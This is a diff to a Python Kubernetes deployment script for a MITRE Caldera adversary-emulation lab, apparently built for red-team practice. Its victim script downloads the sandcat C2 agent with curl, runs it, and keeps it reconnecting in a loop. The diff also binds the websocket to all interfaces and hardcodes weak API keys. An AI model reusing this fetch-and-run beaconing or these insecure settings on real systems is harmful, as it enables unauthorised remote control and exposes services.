@@ -170,7 +170,7 @@ def deploy_caldera():
         "port: 8888\n"
         "app.contact.http: http://caldera.piap.svc.cluster.local:8888\n"
         "app.contact.html: /beacon\n"
-        "app.contact.websocket: 127.0.0.1:7012\n"
+        "app.contact.websocket: 0.0.0.0:7012\n"
         "api_key_red: ADMIN123\n"
         "api_key_blue: BLUEADMIN123\n"
         "users:\n"
@@ -221,20 +221,35 @@ def deploy_caldera():
                         name="caldera",
                         image="ghcr.io/mitre/caldera:5.2.0",
                         ports=[client.V1ContainerPort(container_port=8888)],
-                        volume_mounts=[client.V1VolumeMount(
-                            name="caldera-config",
-                            mount_path="/usr/src/app/conf/local.yml",
-                            sub_path="local.yml",
-                        )],
+                        volume_mounts=[
+                            client.V1VolumeMount(
+                                name="caldera-config",
+                                mount_path="/usr/src/app/conf/local.yml",
+                                sub_path="local.yml",
+                            ),
+                            client.V1VolumeMount(
+                                name="caldera-data",
+                                mount_path="/usr/src/app/data",
+                            ),
+                        ],
                         resources=client.V1ResourceRequirements(
                             requests={"memory": "512Mi", "cpu": "250m"},
                             limits={"memory": "2Gi", "cpu": "1000m"},
                         ),
                     )],
-                    volumes=[client.V1Volume(
-                        name="caldera-config",
-                        config_map=client.V1ConfigMapVolumeSource(name="caldera-config"),
-                    )],
+                    volumes=[
+                        client.V1Volume(
+                            name="caldera-config",
+                            config_map=client.V1ConfigMapVolumeSource(name="caldera-config"),
+                        ),
+                        client.V1Volume(
+                            name="caldera-data",
+                            host_path=client.V1HostPathVolumeSource(
+                                path="/opt/caldera-data",
+                                type="DirectoryOrCreate",
+                            ),
+                        ),
+                    ],
                 ),
             ),
         ),
@@ -270,8 +285,7 @@ def deploy_caldera():
 
     # ── 4. ConfigMap: caldera-victim-script ──────────────────────────────────
     victim_script = (
-        "#!/bin/bash\n"
-        "set -e\n\n"
+        "#!/bin/bash\n\n"
         "echo '[victim] Installing tools...'\n"
         "apt-get update -qq && apt-get install -y -qq curl wget iputils-ping netcat-openbsd file 2>/dev/null || true\n\n"
         "echo '[victim] Waiting for Caldera C2 to be ready...'\n"
@@ -286,7 +300,6 @@ def deploy_caldera():
         "    -H 'platform:linux' \\\n"
         "    http://caldera.piap.svc.cluster.local:8888/file/download \\\n"
         "    -o /tmp/sandcat\n\n"
-        "  # Verify we got a real ELF binary (not an error page)\n"
         "  if [ -s /tmp/sandcat ] && file /tmp/sandcat | grep -q 'ELF'; then\n"
         "    echo '[victim] Agent binary downloaded successfully.'\n"
         "    break\n"
@@ -296,9 +309,15 @@ def deploy_caldera():
         "    sleep 10\n"
         "  fi\n"
         "done\n\n"
-        "chmod +x /tmp/sandcat\n"
-        "echo '[victim] Agent downloaded. Connecting to C2 (group: red)...'\n"
-        "/tmp/sandcat -server http://caldera.piap.svc.cluster.local:8888 -group red -v\n"
+        "chmod +x /tmp/sandcat\n\n"
+        "# Run the agent in a loop — reconnect on exit instead of letting\n"
+        "# the container exit and trigger a Kubernetes restart.\n"
+        "while true; do\n"
+        "  echo '[victim] Connecting to C2 (group: red)...'\n"
+        "  /tmp/sandcat -server http://caldera.piap.svc.cluster.local:8888 -group red -v || true\n"
+        "  echo '[victim] Agent exited. Reconnecting in 30s...'\n"
+        "  sleep 30\n"
+        "done\n"
     )
     cm_victim = client.V1ConfigMap(
         metadata=client.V1ObjectMeta(name="caldera-victim-script", namespace=NAMESPACE),
